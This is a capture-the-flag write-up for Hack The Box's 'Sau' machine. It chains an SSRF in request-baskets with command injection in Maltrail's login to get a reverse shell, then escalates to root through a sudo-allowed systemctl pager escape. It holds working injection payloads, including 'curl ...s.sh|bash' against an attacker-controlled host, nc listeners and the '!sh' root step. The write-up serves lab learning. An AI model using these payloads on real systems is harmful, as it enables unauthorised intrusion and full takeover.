# easy - Sau

## User flag

Let's start by running nmap and reviewing any web app.

Nmap results:
```bash
sau➤ sudo nmap -n -Pn -sV -O -T4 sau.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 09:11 -04
Nmap scan report for sau.htb (10.10.11.224)
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
...
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ok so port `80` is filtered and we've got a web app in tcp `55555`.

There is a redirection in there:
```bash
~z➤ curl -v -XGET -IL http://sau.htb:55555/
* processing: http://sau.htb:55555/
*   Trying 10.10.11.224:55555...
* Connected to sau.htb (10.10.11.224) port 55555
> GET / HTTP/1.1
> Host: sau.htb:55555
> User-Agent: curl/8.2.1
> Accept: */*
>
< HTTP/1.1 302 Found
HTTP/1.1 302 Found
< Content-Type: text/html; charset=utf-8
Content-Type: text/html; charset=utf-8
< Location: /web
Location: /web
< Date: Wed, 02 Aug 2023 13:17:34 GMT
Date: Wed, 02 Aug 2023 13:17:34 GMT
< Content-Length: 27
Content-Length: 27

<
* Excess found: excess = 27 url = / (zero-length body)
* Connection #0 to host sau.htb left intact
* Issue another request to this URL: 'http://sau.htb:55555/web'
* Found bundle for host: 0x5630fa988d10 [serially]
* Can not multiplex, even if we wanted to
* Re-using existing connection with host sau.htb
> GET /web HTTP/1.1
> Host: sau.htb:55555
> User-Agent: curl/8.2.1
> Accept: */*
>
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
Content-Type: text/html; charset=utf-8
< Date: Wed, 02 Aug 2023 13:17:34 GMT
Date: Wed, 02 Aug 2023 13:17:34 GMT
< Transfer-Encoding: chunked
Transfer-Encoding: chunked

<
* Excess found: excess = 2556 url = /web (zero-length body)
* Connection #0 to host sau.htb left intact
```

Here the web app:
{{< limg "/i/2023-08-02_09-17.png" "Request Baskets app" >}}

It is an interesting app, it servers a proxy for you that catches all http requests and shows them as history:
{{< limg "/i/2023-08-02_09-22.png" "Requests Basket App" >}}

I thought maybe a cli injection while creating the basket, but no luck.
```bash
~z➤ curl 'http://sau.htb:55555/api/baskets/foo;id' -X POST
invalid basket name; the name does not match pattern: ^[\w\d\-_\.]{1,250}$
```

So what is the page using?

```bash
~z➤ curl -s http://sau.htb:55555/web | xurls
~z➤ curl -s http://sau.htb:55555/web | ag href
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">
      $("#baskets").append("<li id='basket_" + name + "'><a href='/web/" + name + "'>" + name + "</a></li>");
          $("#basket_link").attr("href", "/web/" + basket);
        <a id="refresh" class="navbar-brand" href="#">Request Baskets</a>
          <a href="/web/baskets" alt="Administration" title="Administration" class="btn btn-default">
          <a href="." class="btn btn-default">Back to list of your baskets</a>
          Powered by <a href="https://github.com/darklynx/request-baskets">request-baskets</a> |
```

So github.com/darklynx/request-baskets huh?. Here the CVE & Exploit: https://nvd.nist.gov/vuln/detail/CVE-2023-27163

So I've found something interesting, above from the nmap scanning you saw a filtered port `80`, so in basket I did a test. I created a basket that replies "hello" as part of the http response and then I created another basket and I've found this "Proxy Reverse" text field option, which seems to foward traffic to a backend. 

{{< limg "/i/2023-08-02_09-39.png" "Basket and url forwarding" >}}

We can put whatever we want there, even an internal service in the server, so we can expose it outside :evil:

So that internal web page seems to be a wiki hosted by *mailtrail*:
```html
~z➤ curl -s 'http://sau.htb:55555/hu0wydv' | ag href
        <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <link rel="stylesheet" type="text/css" href="css/media.css">
                <li class="header-li"><a class="header-a" href="https://github.com/stamparm/maltrail/blob/master/README.md" id="documentation_link" target="_blank">Documentation</a></li>
                <li class="header-li"><a class="header-a" href="https://github.com/stamparm/maltrail/wiki" id="wiki_link" target="_blank">Wiki</a></li>
<!--                <li class="header-li"><a class="header-a" href="https://docs.google.com/spreadsheets/d/1lJfIa1jPZ-Vue5QkQACLaAijBNjgRYluPCghCVBMtHI/edit" id="collaboration_link" target="_blank">Collaboration</a></li>
                <li class="header-li"><a class="header-a" href="https://github.com/stamparm/maltrail/issues/" id="issues_link" target="_blank">Issues</a></li>
```

Unfortunely this bug doesn't have a CVE. But an exploit is reported here: https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/ , the PoC: `curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'`

Ok, so that is a CLI injection and I'm able to ping my local computer from the app:
```bash
~z➤ curl 'http://sau.htb:55555/hu0wydv' --data 'username=;`curl 10.10.14.5:8000/`'
Login failed%

# Another shell
.../htb/p8/sau➤ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.224 - - [02/Aug/2023 09:54:02] "GET / HTTP/1.1" 200 -
10.10.11.224 - - [02/Aug/2023 09:54:25] "GET / HTTP/1.1" 200 -
```

Getting reverse shell:
```bash
~z➤ curl 'http://sau.htb:55555/hu0wydv' --data 'username=;`curl 10.10.14.5:8000/s.sh|bash`'

# From another term
.../htb/p8/sau➤ nc -lvnp 55555
Connection from 10.10.11.224:51230
sh: 0: can't access tty; job control turned off
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
$ ls ~/
user.txt
```

## Root flag

So here we can gain root privs via sudo:
```bash
$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

So now that we run systemctl and longer outputs goes directly to `less` pager, we need an interactive shell first and then spawn a shell from `pager` with `!sh`:
```bash
.../htb/p8/sau➤ nc -lvnp 55555
Connection from 10.10.11.224:58850
sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh
!sshh!sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
